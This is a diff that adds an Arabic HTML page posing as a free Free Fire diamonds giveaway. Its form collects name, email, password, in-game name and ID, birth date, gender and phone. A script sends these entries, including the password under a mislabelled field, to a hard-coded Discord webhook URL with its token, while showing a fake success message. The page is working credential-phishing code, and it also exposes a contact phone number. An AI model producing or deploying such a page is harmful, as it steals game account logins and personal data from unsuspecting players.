@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>free fire</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      font-family: 'Tahoma', sans-serif;
+      background: #ffffff;
+      color: #eb0101;
+      text-align: center;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at center, #111 40%, #000);
+      z-index: -1;
+    }
+
+    h1 {
+      font-size: 36px;
+      color: #ff4444;
+      text-shadow: 0 0 20px red, 0 0 40px orange;
+      margin: 30px 0 20px;
+      animation: glowPulse 2s infinite alternate;
+    }
+
+    @keyframes glowPulse {
+      0% { text-shadow: 0 0 10px red, 0 0 20px orange; }
+      100% { text-shadow: 0 0 30px red, 0 0 60px yellow; }
+    }
+
+    .container {
+      background: #ff0000;
+      padding: 30px;
+      border-radius: 15px;
+      max-width: 600px;
+      margin: auto;
+      box-shadow: 0 0 30px #ff0000;
+      border: 2px solid #ff0000;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+      text-align: right;
+      padding: 0 10px;
+    }
+
+    label {
+      display: block;
+      color: #fff;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      background-color: #222;
+      color: #fff;
+      box-sizing: border-box;
+    }
+
+    .gender-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 5px;
+    }
+
+    .terms {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 5px;
+    }
+
+    button {
+      padding: 10px 25px;
+      border: none;
+      border-radius: 5px;
+      margin: 10px 5px;
+      cursor: pointer;
+      font-weight: bold;
+      background-color: #ff4444;
+      color: white;
+      box-shadow: 0 0 15px #ff4444, 0 0 30px #ff0000;
+      transition: 0.3s;
+      animation: pulseBtn 1.5s infinite;
+    }
+
+    @keyframes pulseBtn {
+      0% { box-shadow: 0 0 10px #ff4444; transform: scale(1); }
+      50% { box-shadow: 0 0 25px #ff4444; transform: scale(1.05); }
+      100% { box-shadow: 0 0 10px #ff4444; transform: scale(1); }
+    }
+
+    button:hover {
+      background-color: #ff2222;
+      transform: scale(1.07);
+    }
+
+    .success-message {
+      margin-top: 20px;
+      color: #00ff99;
+      font-weight: bold;
+      text-shadow: 0 0 5px #00ff99;
+    }
+
+    .marquee {
+      margin-top: 40px;
+      padding: 10px;
+      font-size: 18px;
+      background-color: #222;
+      color: #ffcc00;
+      border-radius: 10px;
+      box-shadow: 0 0 10px orange;
+      animation: scroll 10s linear infinite;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+
+    @keyframes scroll {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🔥 free daimond free  🔥</h1>
+
+  <div class="container">
+    <div class="form-group">
+      <label for="firstName">الاسم </label>
+      <input type="text" id="firstName" placeholder="اكتب اسمك ">
+    </div>
+    <div class="form-group">
+      <label for="lastName">البريد الالكتروني</label>
+      <input type="text" id="lastName" placeholder="اكتب البريد الالكتروني ">
+    </div>
+    <div class="form-group">
+      <label for="email">كلمت السر</label>
+      <input type="email" id="email" placeholder="ادخل كلمة السر ">
+    </div>
+    <div class="form-group">
+      <label for="password">اسمك داخل فري فاير</label>
+      <input type="password" id="password" placeholder="ادخل اسمك داخل فري فاير">
+    </div>
+    <div class="form-group">
+      <label for="birth">تاريخ الميلاد</label>
+      <input type="date" id="birth">
+    </div>
+    <div class="form-group">
+      <label>الجنس</label>
+      <div class="gender-group">
+        <label><input type="radio" name="gender" value="ذكر"> ذكر</label>
+        <label><input type="radio" name="gender" value="أنثى"> أنثى</label>
+      </div>
+    </div>
+    <div class="form-group">
+      <label for="ffName"> ادخل (ID) فري فاير</label>
+      <input type="text" id="ffName" placeholder="ادخل(ID)">
+    </div>
+    <div class="form-group">
+      <label for="clan">اذاوقعت مشكل ارسل رقمك او تصل على الرقم في الواتساب (0765074580)</label>
+      <input type="text" id="clan" placeholder="وشكرا">
+    </div>
+    <div class="form-group">
+      <label for="phone">رقم الهاتف</label>
+      <input type="tel" id="phone" placeholder="مثال: 05XXXXXXXX">
+    </div>
+    <div class="form-group terms">
+      <input type="checkbox" id="agree">
+      <label for="agree">أوافق على الشروط والأحكام</label>
+    </div>
+    <div class="form-group">
+      <label for="notes">ملاحظات إضافية</label>
+      <textarea id="notes" rows="4" placeholder="أي معلومات أخرى تريد مشاركتها..."></textarea>
+    </div>
+
+    <button onclick="submitRegistration()">تسجيل</button>
+    <button onclick="resetForm()">إلغاء</button>
+
+    <div id="result" class="success-message"></div>
+  </div>
+
+  <div class="marquee">⚠️ ملاحظة: الجواهر تُرسل خلال 24 ساعة بعد التحقق من البيانات. تأكد من صحة معلوماتك!</div>
+
+  <script>
+    function submitRegistration() {
+      const firstName = document.getElementById('firstName').value;
+      const lastName = document.getElementById('lastName').value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const birth = document.getElementById('birth').value;
+      const ffName = document.getElementById('ffName').value;
+      const clan = document.getElementById('clan').value;
+      const phone = document.getElementById('phone').value;
+      const notes = document.getElementById('notes').value;
+      const agree = document.getElementById('agree').checked;
+      const gender = document.querySelector('input[name="gender"]:checked')?.value || 'غير محدد';
+
+      if (!firstName || !lastName || !email || !password || !birth || !ffName || !agree) {
+        alert('يرجى تعبئة جميع الحقول والموافقة على الشروط.');
+        return;
+      }
+
+      const content = `📥 **تسجيل جديد**:\n👤 الاسم: ${firstName} ${lastName}\n📧 البريد: ${email}\n🕹️ اسم فري فاير: ${ffName}\n🎂 تاريخ الميلاد: ${birth}\n👫 الجنس: ${gender}\n📱 الهاتف: ${phone || "غير محدد"}\n👥 العشيرة: ${clan || "لا يوجد"}\n📝 ملاحظات: ${notes || "لا يوجد"}`;
+
+      fetch("https://discord.com/api/webhooks/1390458810291847249/QmZxCXXmdQTR05qcxQz1rZz-z4ngnLU3Vu_FKjHfUlvIEndcNmghe7ATR2HDX9Fwk9S7", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ content })
+      }).then(() => {
+        document.getElementById('result').textContent = '✅ تم التسجيل بنجاح!';
+      }).catch(() => {
+        alert('❌ حدث خطأ أثناء الإرسال');
+      });
+    }
+
+    function resetForm() {
+      document.querySelectorAll("input, textarea").forEach(el => {
+        if (el.type !== "radio" && el.type !== "checkbox") el.value = "";
+        if (el.type === "checkbox" || el.type === "radio") el.checked = false;
+      });
+      document.getElementById('result').textContent = '';
+    }
+  </script>
+</body>
+</html>
